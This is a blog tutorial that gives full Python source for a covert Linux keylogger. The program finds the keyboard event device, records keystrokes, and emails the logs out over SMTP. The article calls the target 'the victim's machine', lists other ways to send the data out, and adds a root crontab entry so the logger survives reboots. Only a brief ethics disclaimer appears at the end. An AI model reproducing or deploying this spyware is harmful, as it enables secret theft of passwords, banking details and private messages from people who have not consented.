## Introduction

Some recent studies estimate that between 100 to 150 million computers worldwide would be directly infected by at least one malware such as **Trojan** or **Keylogger** to be remotely monitored or controlled by hackers. By using this kind of software, a hacker will be able to recover your personal information such as the usernames and passwords you use to connect to your favorites social network accounts or mail services, your bank account credentials or credit card details, your pictures and much more !!

* * *

## What Is A Keylogger?

First of all, the **keyloggers** are computer programs designed to work on the target computer's software. Families and business people can use keyloggers legally to monitor network usage without their users' direct knowledge or to monitor children's activities on the Net. Even Microsoft publicly admitted that the Windows 10 operating system has a built-in keylogger in its final version.

However, malicious individuals can inject keyloggers on your device to get a remote copy of your **keystrokes** and use it later from criminal purposes.

> I'm sure you've always wondered how these hackers managed to discover valuable data so easily, what are their secrets and their techniques and most importantly how to prevent our data to be stolen? In this article we will focus on the **Keylogger** and how to create such a program in a very easy way using **Python** programming language.

### Create A Keylogger For Linux Machine

In this tutorial, we will create a keylogger working on the Linux machine. Each operating system has a different way to manage keyboard input and for that reason, it's almost impossible to find a **portable keylogger** that could be cross-system. But another article for **Windows** and **MacOS** will come soon. Coding a keylogger by putting your hands into **/dev/event** and understand how are events managed in Linux operating system.

On Linux, everything is file! And the events do not escape the rule. But in which file should we look? We will first go to **/dev/**, that's where are the files of all devices. More precisely, we will go to **/dev/input/** because this folder contains all the input devices which in most cases it means the keyboard and the mouse. Using the command "`ls -la`" you can get a clear idea of the content of this folder in your machine.

```bash
ls -la /dev/input/
```

**Output**

![Want to Create a Linux Keylogger Using Python? Here's How!](https://neoslab.com/uploads/medias/2020/02/want-to-create-a-linux-keylogger-using-python-here-s-how-1.png "Want to Create a Linux Keylogger Using Python? Here's How!")

As you can see we are going to face our first problem! There are many folders, which one should we choose? Since we want to record the keystroke we can logically eliminate everything that is not **eventX**, but we still have a large number of possibilities!

To determinate which **eventX** is the correct one, we will have a look in **/proc/bus/input/devices**

```bash
cat /proc/bus/input/devices
```

This file describes the devices connected to the machine. It seems to be the right place to find out what we are looking for and which event our keyboard is referring to. You can find below a screenshot of the command output in my machine.

![Want to Create a Linux Keylogger Using Python? Here's How!](https://neoslab.com/uploads/medias/2020/02/want-to-create-a-linux-keylogger-using-python-here-s-how-2.png "Want to Create a Linux Keylogger Using Python? Here's How!")

Each section on the file is referring to a device connected to the machine. Once you find the **keyboard** device section, focus on the line "H: Handlers" to catch the **eventX** id.

**How can we be sure that it's the correct keyboard event?**

To be sure that you did find the correct **eventX**, you must refer to the line "`B: EV =*`". This line describes the type of events sent. Whatever the king of machine we are using, a keyboard will always return "`EV = 120013`". So considering this and as my example, I can be sure that my keyboard is referring to as **event4**.

So now that we have our devices and we know in which file they write their stream, let move to the next step.

* * *

### Implement The Keylogger In Python

#### Find The Keyboard

We will start by automating what we saw just before to find the right event file. The easiest way is to use regular expressions.

```bash
with open("/proc/bus/input/devices") as f:
    lines = f.readlines()
    pattern = re.compile("Handlers|EV=")
    handlers = list(filter(pattern.search, lines))
    pattern = re.compile("EV=120013")
    for idx, elt in enumerate(handlers):
        if pattern.search(elt):
            line = handlers[idx - 1]
    pattern = re.compile("event[0-9]")
    infile_path = "/dev/input/" + pattern.search(line).group(0)
```

The above piece of code has for the function to open the file **/proc/bus/input/devices**, read it line by line and find simultaneously the lines of the Handlers (Where we find the event id) and the lines of the EV (Where we find the type of events).

It will return a list which should look like : \[eventX, type, eventX, type, eventX, type, eventX, type, …\]

It only remains to find the type that matches the keyboard (Where we have "EV = 120013") and choose the column before in the list which is the keyboard **eventX**.

**Step two: Pump Everything Up**

Are you curious like me? Let's see what happens if we directly listen to the keyboard event file:

```bash
cat /dev/input/event4
```

**Output**

![Want to Create a Linux Keylogger Using Python? Here's How!](https://neoslab.com/uploads/medias/2020/02/want-to-create-a-linux-keylogger-using-python-here-s-how-3.png "Want to Create a Linux Keylogger Using Python? Here's How!")

As you can see, the output does not look friendly and is not digest, but it was to give you an overview of the content of the **eventX**.

* * *

### How To Read The Even?

What you need to know is that the **eventX**, does not directly receive the characters hit on the keyboard but a data structure each time a key is pressed. The details of these a data structure are :

- **Timestamp**: The date of the event.
- **Even Code**: The type and code of the event (More information can be found [here](https://www.kernel.org/doc/html/v4.17/input/event-codes.html)).
- **Value**: A number that corresponds to the position of the key pressed.

Below the piece of code that will help us to retrieve all the needed information's:

```bash
FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)
in_file = open(infile_path, "rb")
event = in_file.read(EVENT_SIZE)
typed = ""
while event:
    (_, _, type, code, value) = struct.unpack(FORMAT, event)
    if code != 0 and type == 1 and value == 1:
        if code in qwerty_map:
            typed += qwerty_map[code]
    event = in_file.read(EVENT_SIZE)
    if len(typed) == 128:
        with open("out.txt", "a") as f:
            f.write(typed)
            typed = ""
```

Let's see together the purpose of the above piece of code and how we will use it to retrieve the structured data sent to our event file. We start by defining the format **FORMAT** pattern, which it's a string that tells Python what to read and how to sort it. **llHHI** means **long int**, **long int**, **short int**, **short int**, **int**.

After this, we simply unpack the stream and get it into separate variables. The first two **long** store the date which we will not use in this tutorial. The two **short** are the type and the code used. The **int** at the end is the value that interests us.

We then check that the code is different from "0", which means that there was an event with a type equal to "1", which corresponds to a pressed key.

We will need now to convert the value into a character. To do this we will simply define an "`array`" of all the possible values and the respective character. If you want to get a complete list of value, I recommend you to have a look in this [GitHub](https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h)) repository which gives the following python dictionary slightly adapted for an **azerty** keyboard:

```bash
qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "a", 17: "z",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
    27: "$", 28: "\n", 29: "[CTRL]", 30: "q", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
    43: "<", 44: "w", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: ",",
    51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]"
}
```

* * *

### How To Retrieve The Data?

We now know how to capture and store the data but there is still a problem. The ideal would be not to have to reconnect to the victim's machine to catch the data collected by the **keylogger**.

There are lots of techniques to achieve this! We can, for example, send the data over FTP, SSH, SCP, send it on Pastebin or either on Twitter.

For this tutorial, we will see the mails option, since it's something that Python allows you to do.

```bash
def sendEmail(message):
    msg = MIMEMultipart()
    password = PASS
    msg['From'] = EMAIL
    msg['To'] = EMAIL
    msg['Subject'] = "Log clavier"
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP(SERVER)
    if USE_TLS is True:
        server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()
```

**What we do is rather explicit**

- Create a mail server
- Fill in our mail (We consider that we send an email to ourselves)
- Connect to our SMTP server
- Send the string

* * *

### Wrap All The Code Together

```python
#!/usr/bin/env python3
# -*-coding:Latin-1 -*

import sys
import re
import struct
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "a", 17: "z",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
    27: "$", 28: "\n", 29: "[CTRL]", 30: "q", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
    43: "<", 44: "w", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: ",",
    51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
}

USE_TLS = None
SERVER = None
MAIL = None
BUF_SIZE = None
PASS = None
KEYBOARD = "qwerty"

def sendEmail(message):
    msg = MIMEMultipart()
    password = PASS
    msg['From'] = EMAIL
    msg['To'] = EMAIL
    msg['Subject'] = "Log clavier"
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP(SERVER)

    if USE_TLS is True:
        server.starttls()

    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

def main():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()
        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))
        pattern = re.compile("EV=120013")

        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]

        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)
    in_file = open(infile_path, "rb")
    event = in_file.read(EVENT_SIZE)
    typed = ""
    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)
        if code != 0 and type == 1 and value == 1:
            if code in qwerty_map:
                typed += qwerty_map[code]
        if len(typed) > BUF_SIZE:
            print(typed)
            typed = ""
        event = in_file.read(EVENT_SIZE)
    in_file.close()

def usage():
    print("Usage : ./keylogger [your email] [your password] [smtp server] [tls/notls] [buffer_size]") # noqa

def init_arg():
    if len(sys.argv) < 5:
        usage()
        exit()
    global EMAIL
    global SERVER
    global USE_TLS
    global BUF_SIZE
    global PASS
    EMAIL = sys.argv[1]
    PASS = sys.argv[2]
    SERVER = sys.argv[3]
    if sys.argv[4] is "tls":
        USE_TLS = True
    else:
        USE_TLS = False
    BUF_SIZE = int(sys.argv[5])

if __name__ == "__main__":
    init_arg()
    main()
```
Open your terminal, create a file called for example "keylogger.py" and copy and save the above script inside. Once you are done you must make this file executable by doing :

```bash
chmod +x keylogger.py
```

**Usage**

To start your keylogger simply execute the below command using your email parameters. Also please note, to avoid any problem, we highly recommend executing this script with **root** privileges.

```bash
# Buffer size is the number of characters saved in memory before sending an email
sudo python keylogger.py [email] [password] [smtp-server] [tls/notls] [buffer-size]
```

* * *

### Create a Persistence Mechanism

If the user of the computer on which we installed keylogger off or reboot his machine, this will result in the deactivation of our keylogger. So we need a persistence mechanism, to enable our keylogger automatically every time the machine it's stopped or restarted.

Linux offers us many possibilities to do this! For this tutorial, I choose to use the **crontab** option which perfectly matches our needs and very easy to use.

The command to edit the **cron** configuration file is `crontab -e` (We execute it in root because our script needs root permissions to read the keyboard event\*)

```bash
sudo crontab -e
```

Once your crontab editor it's open, simply past the below configuration at the rock bottom of your cron configuration file, replacing first the parameters with your owns and save it before to exit. (The output should look like the below screenshot)

![Want to Create a Linux Keylogger Using Python? Here's How!](https://neoslab.com/uploads/medias/2020/02/want-to-create-a-linux-keylogger-using-python-here-s-how-4.png "Want to Create a Linux Keylogger Using Python? Here's How!")

```bash
00 */6 * * * ./path/to/keylogger.py [email] [password] [smtp-server] [tls/notls] [buffer-size]
```

If you want to be sure that the rules of your crontab have been taken into account by your operating system, simply use the below command to get the list of all cron jobs.

```bash
sudo crontab -l
```
To understand you have to know the syntax of cron: the numbers give the period when we start to execute the job (seconds, minutes, hours, days, days of the week, month, etc) and the command to execute follows, in our case, we run the keylogger every 6h.

* * *

## Conclusion

The keylogger records keystrokes made by users, but it’s essential to approach this knowledge responsibly and ethically. The provided Python script initializes an empty list to store pressed keys, and it captures both alphanumeric and special keys. Remember that using keyloggers without proper consent is unethical and potentially illegal. Always respect privacy and follow legal guidelines when exploring such tools.

### Credits

I wanted since a very long time to write an article on how to create a Python Keylogger working on Linux machine and I must honestly send all my thanks to [melkael](https://github.com/melkael) for his excellent work on the subject and the inspiration he gave me for the realization of this article. If you are french speaker I highly recommended you to read his article "[Comment créer un keylogger en moins de 20 minutes (Même quand on débute en Python)](https://maxou.io/comment-creer-keylogger-python/)"
